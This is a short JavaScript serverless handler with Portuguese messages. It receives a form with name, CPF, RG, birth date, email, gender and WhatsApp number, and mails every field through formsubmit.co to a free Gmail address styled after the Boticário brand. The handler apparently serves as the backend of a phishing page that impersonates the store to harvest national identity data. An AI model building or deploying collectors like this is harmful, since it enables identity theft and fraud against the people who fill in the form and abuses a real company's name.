export default async function handler(req, res) {

  if (req.method !== "POST") {
    return res.status(405).send("Método não permitido");
  }

  const { nome, cpf, rg, nasc, email, genero, whats } = req.body;

  const mensagem = `
Novo cadastro recebido:

Nome: ${nome}
CPF: ${cpf}
RG: ${rg}
Nascimento: ${nasc}
E-mail: ${email}
Gênero: ${genero}
WhatsApp: ${whats}
`;

  try {

    const response = await fetch("https://formsubmit.co/ajax/lojaboticario00@gmail.com", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        subject: "Novo Cadastro",
        message: mensagem
      })
    });

    if (!response.ok) {
      throw new Error("Erro ao enviar email");
    }

    return res.status(200).send("Cadastro enviado");

  } catch (error) {
    return res.status(500).send("Erro interno");
  }

}
